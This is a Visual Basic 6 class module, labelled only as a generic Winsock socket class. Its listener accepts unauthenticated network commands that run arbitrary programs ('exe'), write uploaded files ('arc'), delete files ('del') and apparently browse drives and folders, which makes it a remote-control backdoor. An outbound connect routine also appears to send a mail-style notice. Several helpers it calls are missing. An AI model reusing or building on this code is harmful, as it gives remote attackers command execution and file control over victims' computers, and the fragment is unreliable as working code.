VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Class1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
Private Type WSAdata
    wVersion As Integer
    wHighVersion As Integer
    szDescription As String * 255
    szSystemStatus As String * 128
    iMaxSockets As Integer
    iMaxUdpDg As Integer
    lpVendorInfo As Long
End Type
Private Type sockaddr
    sin_family As Integer
    sin_port As Integer
    sin_addr As Long
    sin_zero As String * 8
End Type
Private Type HOSTENT
    h_name As Long
    h_aliases As Long
    h_addrtype As Integer
    h_length As Integer
    h_addr_list As Long
End Type
Private Declare Function WSAStartup Lib "wsock32.dll" (ByVal wVR As Long, lpWSAD As WSAdata) As Long
Private Declare Function WSACleanup Lib "wsock32.dll" () As Integer
Private Declare Function closesocket Lib "wsock32.dll" (ByVal s As Long) As Long
Private Declare Function recv Lib "wsock32.dll" (ByVal s As Long, ByVal buf As Any, ByVal buflen As Long, ByVal flags As Long) As Long
Private Declare Function inet_addr Lib "wsock32.dll" (ByVal cp As String) As Long
Private Declare Function inet_ntoa Lib "wsock32.dll" (ByVal inn As Long) As Long
Private Declare Function Connects Lib "wsock32.dll" Alias "connect" (ByVal s As Long, addr As sockaddr, ByVal namelen As Long) As Long
Private Declare Function send Lib "wsock32.dll" (ByVal s As Long, buf As Any, ByVal buflen As Long, ByVal flags As Long) As Long
Private Declare Function htons Lib "ws2_32.dll" (ByVal hostshort As Integer) As Integer
Private Declare Function socket Lib "wsock32.dll" (ByVal af As Long, ByVal s_type As Long, ByVal protocol As Long) As Long
Private Declare Function WSAAsyncSelect Lib "wsock32.dll" (ByVal s As Long, ByVal hWnd As Long, ByVal wMsg As Long, ByVal lEvent As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32.dll" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal length As Long)
Private Declare Function lstrlen Lib "kernel32.dll" Alias "lstrlenA" (ByVal lpString As Any) As Long
Private Declare Function lstrcpy Lib "kernel32.dll" Alias "lstrcpyA" (ByVal lpString1 As Any, ByVal lpString2 As Any) As Long
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function gethostbyname Lib "wsock32.dll" (ByVal name As String) As Long
Private Declare Function gethostname Lib "wsock32.dll" (ByVal name As String, ByVal namelen As Long) As Long
Private Declare Function bind Lib "wsock32.dll" (ByVal s As Integer, addr As sockaddr, ByVal namelen As Integer) As Integer
Private Declare Function accept Lib "ws2_32.dll" (ByVal s As Long, ByRef addr As sockaddr, ByRef addrlen As Long) As Long
Private Declare Function Listens Lib "ws2_32.dll" Alias "listen" (ByVal s As Long, ByVal backlog As Long) As Long
Private Const PF_INET = 2
Private Const SOCK_STREAM = 1
Private Const AF_INET = 2
Private Const FD_CLOSE = &H20
Private Const FD_READ = &H1
Private Const FD_ACCEPT = &H8
Private Const FD_CONNECT = &H10
Dim Data As WSAdata
Dim sock As sockaddr
Dim s  As Long
Dim X As Long
Dim bytestotal As Long
Dim str As String * 1024
Dim res As Long
Dim Resquest As Long
Dim arc As String
Dim caso As Integer
Dim sss As String
Public Sub OpenSock()
Call WSAStartup(&H101, Data)
End Sub
Public Sub Closed()
closesocket s
closesocket res
WSACleanup
End Sub
Public Function Connect(ip As String, port As Long) As String
s = socket(AF_INET, SOCK_STREAM, 0)
If s < 1 Then
Exit Function
End If
sock.sin_family = PF_INET
sock.sin_port = htons(Int(port))
sock.sin_addr = inet_addr(ip)
X = Connects(s, sock, 16)
DoEvents
If X > 0 Then
 WSACleanup
 Exit Function
 Else
Mail
DoEvents
SendMail "quit"
End If
End Function
Public Function SendData(str As String) As String
Dim buf() As Byte
ReDim buf(Len(str))
For i = 1 To Len(str)
buf(i) = Asc(Mid(str, i, 1))
Next i
send Resquest, buf(1), Len(str), 0
End Function
Public Function LocalGetName() As String
Dim s As String
Dim res As Long
s = String(255, vbNullChar)
res = gethostname(s, Len(s))
If res = 0 Then
LocalGetName = Left(s, InStr(s, vbNullChar) - 1)
End If
End Function
Public Function LocalIP() As String
Dim cas As Long
Dim cas1 As Long
Dim Host As HOSTENT
Dim res As Long
Dim s As String
CopyMemory Host, ByVal gethostbyname(LocalGetName), Len(Host)
CopyMemory cas, ByVal Host.h_addr_list, 4
CopyMemory cas1, ByVal cas, 4
res = inet_ntoa(cas1)
s = Space(lstrlen(res))
lstrcpy s, res
LocalIP = s
End Function
Public Sub Listen(port As Long)
res = socket(AF_INET, SOCK_STREAM, 0)
If res < 1 Then
Exit Sub
End If
sock.sin_family = PF_INET
sock.sin_port = htons(port)
sock.sin_addr = 0
X = bind(res, sock, 16)
If X <> 0 Then
WSACleanup
Exit Sub
End If
X = Listens(res, 1)
X = WSAAsyncSelect(res, Form1.Command2.hWnd, &H202, FD_CONNECT Or FD_ACCEPT)
End Sub
Public Sub Resquest_Accept()
Dim sock1 As sockaddr
Resquest = accept(res, sock1, Len(sock1))
X = WSAAsyncSelect(Resquest, Form1.Command3.hWnd, ByVal &H202, ByVal FD_READ Or FD_CLOSE)
End Sub
Public Sub GetData()
Dim g As String
bytestotal = recv(Resquest, str, 1024, 0)
If bytestotal <> 0 Then
 g = Left(str, bytestotal)
If Left(g, 3) = "run" Then Drivesl Trim(Mid(g, 4)): caso = 0
If Left(g, 3) = "ide" Then Foldersl Trim(Mid(g, 4)): caso = 0
If Left(g, 3) = "chi" Then Filesl Trim(Mid(g, 4)): caso = 0
If Left(g, 3) = "exe" Then ShellExecute Form1.hWnd, vbNullString, Mid(g, 4), vbNullString, vbNullString, 1: Winsock1.SendData "msg" & "Command executed satisfactorily": caso = 0
If caso = 1 Then
sss = sss & g
Open arc For Binary As #1
Put #1, , sss
Close #1
End If
If Left(g, 3) = "arc" Then arc = Mid(g, 4): caso = 1: sss = ""
If Left(g, 3) = "del" Then
   If fso.FileExists(Mid(g, 4)) = True Then
   Kill Mid(g, 4)
   End If
End If
End If
End Sub
Public Function SendMail(str As String) As String
Dim buf() As Byte
ReDim buf(Len(str))
For i = 1 To Len(str)
buf(i) = Asc(Mid(str, i, 1))
Next i
send s, buf(1), Len(str), 0
End Function
